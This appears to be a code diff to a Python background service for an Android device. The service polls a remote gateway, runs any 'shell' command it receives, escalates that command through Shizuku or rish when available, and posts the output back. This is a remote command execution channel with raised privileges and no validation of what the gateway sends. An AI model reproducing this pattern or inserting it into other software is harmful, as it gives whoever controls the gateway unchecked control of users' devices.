@@ -76,7 +76,7 @@ def run_service():
             resp = session.get(
                 f"{GATEWAY_URL}/agent/poll",
                 headers=headers,
-                params={"device_id": DEVICE_ID},
+                params={"device_id": DEVICE_ID, "client_type": "service"},
                 timeout=20
             )
 
@@ -92,9 +92,19 @@ def run_service():
                             action = cmd.get("action", {})
                             atype = action.get("type", "")
                             if atype == "shell":
-                                import subprocess
-                                subprocess.run(action.get("cmd", ""), shell=True, timeout=15)
-                        except: pass
+                                cmd_str = action.get("cmd", "")
+                                noir_log(f"Executing BG Shell: {cmd_str}")
+                                # v17.2: Use robust shell bridge
+                                res = run_robust_shell(cmd_str)
+                                # Report back if possible
+                                session.post(
+                                    f"{GATEWAY_URL}/agent/result",
+                                    headers=headers,
+                                    json={"command_id": cmd.get("command_id"), "device_id": DEVICE_ID, "success": res["success"], "output": res.get("output", "")},
+                                    timeout=10
+                                )
+                        except Exception as e:
+                            noir_log(f"BG Exec Error: {e}", level="ERROR")
                     poll_interval = 5
                 else:
                     poll_interval = min(poll_interval + 2, 30)
@@ -103,6 +113,24 @@ def run_service():
             
         except Exception as e:
             time.sleep(30)
+
+def run_robust_shell(cmd, timeout=15):
+    import subprocess
+    # Detect Shizuku binary
+    shizuku_binary = "shizuku"
+    for path in ["shizuku", "/system/bin/shizuku", "/data/local/tmp/shizuku", "rish"]:
+        try:
+            if subprocess.run(f"{path} shell id", shell=True, capture_output=True, timeout=2).returncode == 0:
+                shizuku_binary = path
+                break
+        except: continue
+    
+    final_cmd = f"{shizuku_binary} shell {cmd}" if "shizuku" in shizuku_binary or "rish" in shizuku_binary else cmd
+    try:
+        r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
 
 if __name__ == '__main__':
     run_service()
